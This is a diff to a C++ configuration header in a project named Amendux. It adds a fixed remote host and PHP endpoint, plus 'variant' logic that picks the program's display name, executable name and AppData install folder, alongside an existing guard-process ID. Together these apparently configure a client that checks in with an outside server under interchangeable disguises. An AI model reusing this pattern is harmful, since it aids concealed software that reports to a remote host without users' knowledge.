@@ -2,6 +2,15 @@
 
 #include <sstream>
 #include "CoreInterface.h"
+#include "Variant.h"
+
+#if DEBUG
+#define AVC_HOST		"0x17.nl"
+#define AVC_ENDPOINT	"avc_endpoint.php"
+#else
+#define AVC_HOST		"0x17.nl"
+#define AVC_ENDPOINT	"avc_endpoint.php"
+#endif
 
 namespace Amendux {
 
@@ -20,6 +29,7 @@ namespace Amendux {
 		std::wstring instanceGUID;
 		OperationMode currentMode = OperationMode::BASE;
 		bool bSuccess = true;
+		unsigned int variant = VARIANT_INVALID;
 		unsigned int uGuardProcessId;
 		unsigned int mainThreadId;
 
@@ -43,9 +53,23 @@ namespace Amendux {
 			return mainThreadId;
 		}
 
+		inline std::wstring DisplayName() const {
+			std::string displayName = Variant::getDisplayName(variant);
+
+			return std::wstring(displayName.begin(), displayName.end());
+		}
+
+		inline std::wstring ExeName() const {
+			std::string exeName = Variant::getExeName(variant);
+
+			return std::wstring(exeName.begin(), exeName.end()) + L".exe";
+		}
+
 		inline std::wstring DataDirectory() const {
 			std::wstring dataDir = std::wstring(Util::getDirectory(Util::Directory::USER_APPDATA));
-			return dataDir + L"\\Amendux";
+			std::string pathExt = Variant::getPath(variant);
+			
+			return dataDir + std::wstring(pathExt.begin(), pathExt.end());
 		}
 
 		inline void SetMode(OperationMode om) {
@@ -150,6 +174,10 @@ namespace Amendux {
 		}
 
 		static bool Success() {
+			if (s_Config->variant == VARIANT_INVALID) {
+				return false;
+			}
+
 			return s_Config->bSuccess;
 		}
 
